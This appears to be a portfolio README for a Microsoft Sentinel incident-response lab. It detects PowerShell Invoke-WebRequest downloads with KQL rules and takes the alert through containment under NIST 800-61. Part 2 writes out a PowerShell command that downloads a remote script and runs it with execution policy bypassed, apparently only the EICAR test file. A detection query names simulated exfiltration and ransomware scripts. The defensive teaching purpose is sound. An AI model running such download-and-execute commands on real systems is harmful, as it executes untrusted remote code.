# Incident-Response-PowerShell-Suspicious-Web-Request-NIST-800-61

![maxresdefault](https://github.com/user-attachments/assets/558ecbf6-9f87-49e7-8ba5-4a887e417840)

# Felipe Restrepo - Incident Response Project: PowerShell Suspicious Web Request

![1_H8m1AnUcij509FjfffrQ4w](https://github.com/user-attachments/assets/49cf05ff-84b1-4c26-8f68-0a0662b26d38)

# Explanation
Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet. 

![Screenshot 2025-06-25 003037](https://github.com/user-attachments/assets/ef91ba7b-99fa-489b-84f2-de5439d8f486)

## 📌 Overview
This Microsoft Sentinel project demonstrates a real-world incident response scenario where PowerShell is abused by an attacker to download potentially malicious scripts using `Invoke-WebRequest`. It walks through every phase of the NIST 800-61 Incident Response Lifecycle and shows how to:

- Detect the suspicious behavior
- Automate alerting and incident generation
- Investigate and analyze
- Contain and recover
- Document findings and improve defenses

---

## 🔍 Step-by-Step Implementation

### ✅ Part 1: Create Alert Rule - PowerShell Suspicious Web Request

![Screenshot 2025-06-24 234055](https://github.com/user-attachments/assets/1aadda59-905b-48d9-a49e-80082432cdf1)

**Purpose:** Detect when PowerShell is used to download files using `Invoke-WebRequest`, signaling possible attacker activity.

**Rule Details:**
- **Name:** Felipe Restrepo - PowerShell Suspicious Web Request
- **Severity:** Medium
- **MITRE ATT&CK:**
  - T1071.001 – Web Protocols
  - T1105 – Ingress Tool Transfer
  - T1203 – Exploitation for Client Execution
  - T1041 – Exfiltration Over C2

![Screenshot 2025-06-24 234237](https://github.com/user-attachments/assets/cc3c270f-d6ff-4279-88f9-dfec5deeb90e)
![Screenshot 2025-06-24 234305](https://github.com/user-attachments/assets/34f16295-add7-4e24-94d1-c9a14b4ea98f)
![Screenshot 2025-06-24 234328](https://github.com/user-attachments/assets/6783eed8-1419-4337-bd55-b0f19ec22298)
![Screenshot 2025-06-24 234354](https://github.com/user-attachments/assets/0911b21c-7516-49f1-a39c-96af079259d2)

**KQL Detection Query:**
```kql
let TargetDevice = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "invoke-WebRequest"
```
![image](https://github.com/user-attachments/assets/b35df73c-385d-4270-88e2-d8505cba2840)

- **Entity Mapping:**
  - Account → AccountName
  - Host → DeviceName
  - Process → ProcessCommandLine
![Screenshot 2025-06-24 234645](https://github.com/user-attachments/assets/d8c4abf2-1602-4244-bcb8-0dd5bdced36c)

- **Query Schedule:** Every 4 hours, looking back 24 hours

![Screenshot 2025-06-24 234716](https://github.com/user-attachments/assets/da49f487-065f-4455-a9f2-9a58bd509126)

- **Alert threshold:** Is greater than 0

![Screenshot 2025-06-24 234723](https://github.com/user-attachments/assets/6e50c1d3-fc62-4923-bd82-e934bb148e45)

- **Suppression:** Enabled for 24 hours

![Screenshot 2025-06-24 234742](https://github.com/user-attachments/assets/30152700-f6b1-4a5a-aca9-2b18b6926315)

- **Alert Grouping**: Enabled

![Screenshot 2025-06-24 234800](https://github.com/user-attachments/assets/1f3d2470-4461-4ee5-97e1-5c1cfaf79830)

- **Rule Created and Actived by me who owns it**
![Screenshot 2025-06-24 234832](https://github.com/user-attachments/assets/212fb1fb-349e-42ac-9108-0a275b1d46f9)
![Screenshot 2025-06-24 235240](https://github.com/user-attachments/assets/07c7b81d-8d5d-4c85-92fe-52e8af568b7b)

---

### 🛑 Part 2: Trigger Alert & Create Incident

**Purpose:** Generate logs by executing PowerShell web requests, which will trigger the alert rule in Sentinel.

**PowerShell Commands to Run on VM:**
```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```
**Result:** Microsoft Sentinel triggers the scheduled query and creates an incident.

---

### 🔎 Part 3: Investigate and Analyze the Incident

**Actions Taken:**
1. Alert was triggered on `windows-target-1`.
2. Entity mappings showed the account and command line activity.
3. User claimed they had installed free software before event.
4. Defender for Endpoint showed:

**KQL to Confirm Execution of Scripts:**
```kql
let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```

![Screenshot 2025-06-25 001034](https://github.com/user-attachments/assets/91a00692-083c-4b29-8ff8-477de82106b5)

**🔎Investigated in the Investigation page for better analysis**

![Screenshot 2025-06-24 235327](https://github.com/user-attachments/assets/45bfd65a-e1f2-42c2-8147-b855e47d3c6c)
![Screenshot 2025-06-24 235648](https://github.com/user-attachments/assets/17eb0586-3194-444e-88fb-7b0335d7d6c8)


**Summary of Detected Scripts:**
| Script | Description |
|--------|-------------|
| `portscan.ps1` | Simulates a port scan |
| `pwncrypt.ps1` | Simulates ransomware-like encryption |
| `eicar.ps1` | Triggers antivirus as a test |
| `exfiltratedata.ps1` | Simulates data exfiltration |

---

### 🔒 Part 4: Containment, Eradication, and Recovery

**Actions:**
- Isolated VM in Microsoft Defender for Endpoint (MDE)
![Screenshot 2025-06-25 001624](https://github.com/user-attachments/assets/95d9320a-ee4b-4fe8-b894-2f2110cbaa99)

- Ran antivirus scan

![Screenshot 2025-06-25 001631](https://github.com/user-attachments/assets/3e522f68-c2e1-4eb6-8763-5e20119e8f75)

- Removed isolation after VM came back clean

---

### 📘 Part 5: Post-Incident Activities

**Notes and Improvements:**
- Updated PowerShell policy to restrict use to admins only
- Enrolled user in advanced cybersecurity awareness training (via KnowBe4)

---

### 🧹 Part 6: Process Closed and Cleaned Up

**After adding the notes to the incident I closed the case to show that I was able Respond to the Incident**

![Screenshot 2025-06-25 004354](https://github.com/user-attachments/assets/91ceca36-e86e-40dc-bc59-d9e967c5d46b)
![Screenshot 2025-06-25 004532](https://github.com/user-attachments/assets/1f4dc191-7480-4a76-8088-a66253e10c2a)

---

## 📌 Final Notes:
- This project is based on Felipe Restrepo's real-world detection and incident response case using Microsoft Sentinel.
- It emphasizes a full detection-to-resolution workflow with hands-on implementation of a MITRE-aligned use case.
- Ideal for security analyst portfolios or blue team practice labs.

---

### 📎 References
- Microsoft Sentinel documentation
- MITRE ATT&CK Framework
- Josh Madakor Cyber Range Scripts
- NIST 800-61: Computer Security Incident Handling Guide
